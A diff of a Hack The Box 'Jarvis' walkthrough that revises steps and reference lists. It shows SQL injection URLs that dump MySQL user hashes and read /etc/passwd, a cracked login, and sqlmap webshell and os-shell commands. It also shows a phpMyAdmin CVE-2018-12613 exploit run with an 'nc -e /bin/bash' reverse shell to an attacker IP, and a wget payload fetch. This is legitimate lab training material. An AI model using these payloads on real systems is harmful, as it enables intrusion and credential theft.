@@ -36,7 +36,7 @@ Port tcp 64999: Apache httpd 2.4.25
 
 + Both domain names redirect to the same website.
 + Next, view page source, and there's nothing useful.
-+ As always, on each web app, start directory fuzzing:
++ As always, on each web app, start directory fuzzing, and also try to use `/usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt` alternative wordlist.
 ```
 gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k -n -x html,php,txt -r -t 1 --exclude-length 277
 ```
@@ -219,9 +219,16 @@ http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4
 http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password,":",File_priv),4,5,6,7+from+mysql.user;-- -
 
 http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(User,":",Password,":",File_priv) FROM mysql.user),4,5,6,7;-- -
+
+# Alternatively:
+http://10.10.10.143/room.php?cod=55+union+select+1,Password,3,4,User,6,7+from+mysql.user;-- -
 ```
 
++ The user appears to be **DBadmin**. Checking file privileges for the current user to ensure it can edit files, this is done by checking the **file_priv** column of the **mysql.user** table.
+
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/11708e5e-3119-4581-a55d-06b195ff009c)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e05e17d3-7937-4828-af18-82a3ff101a1a)
 
 + Crack the hash with [crackstation](https://crackstation.net/), and credentials: `DBadmin`:`imissyou`.
 ```
@@ -274,7 +281,7 @@ database management system users password hashes:
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/456d2ac4-4fe4-4dd2-adf1-fe2ed4706eeb)
 
 + The version of phpMyAdmin is 4.8.0, and check whether it has any exploits: `searchsploit phpMyAdmin 4.8`
-+ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with CVE-2018-12613 [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) [3-PoC](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) in this version. The exploits require authentication, so we'll use the discovered credentials in the above [1](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#step-3-enumerating-dbms-characteristics) [2](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#exploitation-method-2---sqlmap).
++ There's a local file include (LFI) vulnerability that allows for remote code execution (RCE) with **CVE-2018-12613** [1](https://www.exploit-db.com/exploits/44928) [2](https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/) [3-PoC](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) [4](https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e) in this version. The exploits require authentication, so we'll use the discovered credentials in the above [1](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#step-3-enumerating-dbms-characteristics) [2](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#exploitation-method-2---sqlmap).
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4f986e6f-096f-4030-9912-23431041e16f)
 
@@ -313,10 +320,10 @@ select '<?php exec("wget -O /var/www/html/revshell.php http://10.10.14.8/revshel
 
 + **Alternatively**, try [Poc](https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700) to get a shell.
 + `python poc.py -u DBadmin -p imissyou -U http://10.10.10.143/phpmyadmin -P 'system("nc -e /bin/bash 10.10.14.88 4444");'`
++ **Other Alternative**, try [1](https://www.exploit-db.com/exploits/50457) [2](https://www.shadabansari.net/2023/02/htb-jarvis.html).
 
 
-
-## Gaining Access: Method 2 - SQLi
+## Gaining Access: Method 2 - SQLi (manual)
 + Try to view **/etc/passwd** file: 
 ```
 http://10.10.10.143/room.php?cod=55+union+select+1,2,3,4,load_file("/etc/passwd"),6,7+FROM+mysql.user;-- -
@@ -368,20 +375,19 @@ http://10.10.10.143/room.php?cod=55+union+select 1,2,3,4,(select '<?php exec(\"w
 
 
 
-## Gaining Access: Method 3 - sqlmap
-+ Do the same phpmyadmin attack as shown [above](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#gaining-access-method-1). using sqlmap to write a webshell:
+## Gaining Access: Method 3 - sqlmap (--file-write & --file-dest) (no write permission)
++ Do the same phpmyadmin attack as shown [above](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/26_Jarvis.md#gaining-access-method-1) using sqlmap to write a webshell:
 ```
-sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --file-write shell.php --file-dest /var/www/html/shell.php
+sqlmap -u http://10.10.10.143/room.php?cod=5 --batch --dbs --random-agent --file-write shell.php --file-dest /var/www/html/shell.php
 ```
 
-![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9603124c-8060-478b-95da-652e53e2752b)
++ It fails since the DBMS process user has **no write privileges** in the destination path. Also you can check the [reference](https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html#path-2-webshell-via-sqli).
 
-+ Start a netcat listener on the attack machine: `nc -lnvp 4444`
-+ Get the shell: `curl http://10.10.10.143/shell.php`
-
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6872931b-b442-4305-8e1f-cdf233f91672)
 
 
-## Gaining Access: Method 4 - sqlmap
+
+## Gaining Access: Method 4 - sqlmap (--os-shell)
 + There's another cool feature `--os-shell` in SQLMap that will try to get a shell on the host running the web server.
 ```
 sqlmap -u http://10.10.10.143:80/room.php?cod=5 --batch --dbs --random-agent --os-shell
@@ -510,10 +516,28 @@ WantedBy=multi-user.target
 
 + Start a netcat listener on the attack machine: `nc -lnvp 5555`
 + In the target machine, start the **shell** service: `/bin/systemctl start shell`
-+ Get the root shell.
++ Get the root shell, and view root flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1e77d5f4-ba24-4fa3-a075-d274510fdb03)
 
+
+# References & Alternatives
++ https://vvmlist.github.io/#jarvis
++ https://amandaszampias.blogspot.com/2020/12/htb-jarvis-mysql.html
++ https://steflan-security.com/hack-the-box-jarvis-walkthrough/
++ https://www.shadabansari.net/2023/02/htb-jarvis.html
++ https://shreyapohekar.com/blogs/jarvis-hackthebox-walkthrough/
++ https://pwnedcoffee.com/hackthebox/jarvis/
++ https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
++ https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
++ https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
++ https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
++ https://www.hackingarticles.in/hack-the-box-jarvis-walkthrough/
++ https://t3chnocat.com/htb-jarvis/
++ https://clubby789.me/hackthebox/jarvis/
++ https://sarthaksaini.com/2019/June/Jarvis-htb/Writeup.html
++ https://habr.com/ru/articles/595851/
 
 
 # Technical Knowledge
@@ -523,10 +547,13 @@ WantedBy=multi-user.target
 + https://ivanitlearning.wordpress.com/2020/02/10/vulnhub-kioptrix-lvl-3/
   + https://kamransaifullah.medium.com/walkthrough-kioptrix-3-by-vulnhub-bdfb0fba64e1
 + https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+  + https://gist.github.com/bradtraversy/c831baaad44343cc945e76c2e30927b3
   + https://pentestmonkey.net/category/cheat-sheet/sql-injection
 + https://www.siteground.com/kb/what_is_the_information_schema_database/
   + https://www.geeksforgeeks.org/mysql-group_concat-function/
+  + https://mariadb.com/kb/en/group_concat/
   + https://dev.mysql.com/doc/refman/5.7/en/select.html
+  + https://dev.mysql.com/doc/refman/8.0/en/select.html
   + https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
 + http://www.unixwiz.net/techtips/sql-injection.html
 + https://www.acunetix.com/websitesecurity/sql-injection2/
@@ -535,6 +562,11 @@ WantedBy=multi-user.target
 **LFI:**
 + https://ivanitlearning.wordpress.com/2020/02/20/vulnhub-pwnos-2-0/
 + https://www.exploit-db.com/papers/14635
++ https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
++ https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e
+
+**php:**
++ https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
 
 **$(command) and Systemd:**
 + https://ivanitlearning.wordpress.com/2019/12/08/overthewire-natas16-17/
@@ -549,21 +581,8 @@ WantedBy=multi-user.target
 + **CVE-2018-12613:** https://www.exploit-db.com/exploits/44928
 + https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/
 + **PoC:** https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700
-
-
-# References & Alternatives
-+ https://vvmlist.github.io/#jarvis
-+ https://shreyapohekar.com/blogs/jarvis-hackthebox-walkthrough/
-+ https://pwnedcoffee.com/hackthebox/jarvis/
-+ https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
-+ https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
-+ https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
-+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
-+ https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
-
-+ 
-+ xxx
-
++ https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e
++ https://www.exploit-db.com/exploits/50457
 
 # For More
 + https://en.wikipedia.org/wiki/History_of_Microsoft_SQL_Server#Release_summary
